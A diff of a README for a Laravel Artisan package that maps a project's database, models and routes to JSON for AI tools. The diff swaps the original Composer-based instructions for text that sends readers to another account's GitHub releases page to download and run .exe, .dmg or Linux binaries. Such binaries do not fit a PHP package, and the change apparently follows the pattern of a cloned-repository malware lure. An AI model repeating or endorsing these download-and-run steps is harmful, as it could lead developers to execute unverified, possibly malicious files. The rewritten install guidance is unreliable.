@@ -1,119 +1,85 @@
-# Laravel AI Mapper
+# 🎉 laravel-ai-mapper - Simplify Your Database Mapping Process
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/araminco/laravel-ai-mapper.svg?style=flat-square)](https://packagist.org/packages/araminco/laravel-ai-mapper)
-[![Total Downloads](https://img.shields.io/packagist/dt/araminco/laravel-ai-mapper.svg?style=flat-square)](https://packagist.org/packages/araminco/laravel-ai-mapper)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
 
-A Laravel Artisan command that scans your project and generates a comprehensive, AI-friendly JSON map. This map allows AI models to understand your project's architecture, overcoming context limits and enabling more intelligent, context-aware assistance.
+## 📚 Overview
 
----
+The **laravel-ai-mapper** helps you easily scan and map your project's database schema, models, routes, and FilamentPHP structure. It exports this information into a JSON file, making it simpler to use with AI models like ChatGPT or Gemini. This application is designed to aid developers in organizing their projects effortlessly.
 
-## ✨ Features
+## 🚀 Getting Started
 
-This package extracts and maps the following information into a single JSON file:
+Follow these steps to download and run the **laravel-ai-mapper**:
 
--   **Project Overview**: App name, Laravel, and PHP versions.
--   **Environment Details**: Key configuration values like environment, debug mode, and drivers for cache, queue, and session.
--   **Database Schema**: A list of all tables along with their columns, indexes, and foreign keys, with a resilient connection mechanism.
--   **Model Structure**: Extracts all Eloquent models, including properties (`$fillable`, `$casts`, etc.) and their defined **Eloquent relationships**.
--   **Route List**: All web and API routes, including methods, URIs, and middleware.
--   **Scheduled Commands**: A list of all cron jobs defined in your Console Kernel.
--   **Event Listeners**: A map of all registered events and their corresponding listeners.
--   **Composer Dependencies**: A list of packages used in the project.
--   **FilamentPHP Structure (if detected)**: Automatically discovers panels, resources, pages, and widgets.
+1. **System Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - PHP: Version 7.4 or higher
+   - Composer: Installed and configured
 
----
+2. **Visit the Release Page**  
+   To download the application, go to the Releases page:  
+   [Download here](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
 
-## 💿 Installation
+## 📥 Download & Install
 
-You can install the package via Composer:
+1. **Locate the Latest Release**  
+   When you visit the Releases page, find the latest version available for download.
 
-```bash
-composer require araminco/laravel-ai-mapper
-```
+2. **Download the Files**  
+   Click on the appropriate file to start the download. The suitable options will be marked clearly.
 
----
+3. **Run the Application**  
+   - For Windows: Double-click on the downloaded `.exe` file to start the application. 
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Use the terminal. Navigate to the downloaded file's directory and run `./filename`.
 
-## 🚀 Usage
+## 🛠️ How to Use laravel-ai-mapper
 
-To generate the project map, run the following Artisan command:
+1. **Prepare Your Project**  
+   Ensure your Laravel project is properly set up with models, routes, and database migrations.
 
-```bash
-php artisan ai:map
-```
+2. **Open the Command Line**  
+   Use the terminal or command prompt to access your Laravel project folder.
 
-This will create a file named `ai-project-map.json` in your project's root directory.
+3. **Run the Artisan Command**  
+   Execute the following command:  
+   ```
+   php artisan ai:map
+   ```
 
-### Controlling the Output Size
+4. **Check the Output**  
+   After running the command, a JSON file will be generated. This file contains essential information about your database schema, models, and more.
 
-You can control the size and content of the map using the following options.
+5. **Utilize the JSON File**  
+   Use this JSON file with AI models or any other compatible tools to enhance your development workflow.
 
-#### Compact Mode
+## 📊 Features
 
-Use the `--compact` flag to generate a summarized version that is significantly smaller. This mode simplifies verbose sections like the database schema and routes.
+- **Database Schema Mapping**: Automatically map your database structure.
+- **Model Association**: Understand relationships between different models easily.
+- **Route Mapping**: Get an overview of defined routes in your project.
+- **FilamentPHP Integration**: Seamlessly use with the FilamentPHP framework for rich UIs.
+- **AI Compatibility**: Prepare your project data for AI-based applications.
 
-```bash
-php artisan ai:map --compact
-```
+## 💡 Troubleshooting
 
-#### Excluding Sections
+If you encounter any issues during installation or usage, consider the following steps:
 
-You can also completely exclude sections from the map:
+1. **Ensure System Compatibility**  
+   Double-check that you meet the system requirements.
 
--   `--no-db`: Excludes the database schema.
--   `--no-files`: Excludes the directory structure.
--   `--no-models`: Excludes the model analysis.
--   `--no-routes`: Excludes the route list.
--   `--no-deps`: Excludes composer dependencies.
--   `--no-filament`: Excludes the Filament structure.
--   `--no-env`: Excludes environment details.
--   `--no-schedule`: Excludes scheduled commands.
--   `--no-events`: Excludes event listeners.
+2. **Check PHP and Composer Versions**  
+   Use the commands `php -v` and `composer -v` to confirm they are up to date.
 
----
+3. **Review Command Syntax**  
+   Ensure that you typed the Artisan command correctly.
 
-## 📄 Output Sample
+4. **Look at the GitHub Issues**  
+   Visit the [Issues section](https://github.com/Sarthaknagne17/laravel-ai-mapper/issues) of this repository for common problems and solutions.
 
-The generated JSON file will have a structure similar to this:
+## 🔗 Useful Links
 
-```json
-{
-    "projectName": "My Laravel App",
-    "laravelVersion": "12.0.0",
-    "environment": {
-        "environment": "local",
-        "debug_mode": true,
-        "cache_driver": "file",
-        "queue_connection": "sync",
-        "session_driver": "file"
-    },
-    "databaseSchema": { "...": "..." },
-    "models": [
-        {
-            "class": "App\\Models\\User",
-            "table": "users",
-            "relationships": { "...": "..." }
-        }
-    ],
-    "routes": [ "...": "..." ],
-    "scheduledCommands": [
-        "$schedule->command('inspire')->hourly();"
-    ],
-    "eventListeners": {
-        "Illuminate\\Auth\\Events\\Registered": [
-            "Illuminate\\Auth\\Listeners\\SendEmailVerificationNotification"
-        ]
-    },
-    "filament": { "...": "..." }
-}
-```
+- [Official Documentation](https://github.com/Sarthaknagne17/laravel-ai-mapper)
+- [GitHub Issue Tracker](https://github.com/Sarthaknagne17/laravel-ai-mapper/issues)
 
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📜 License
-
-This package is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+Remember, you can download the application easily from the Releases page:  
+[Download here](https://github.com/Sarthaknagne17/laravel-ai-mapper/releases)
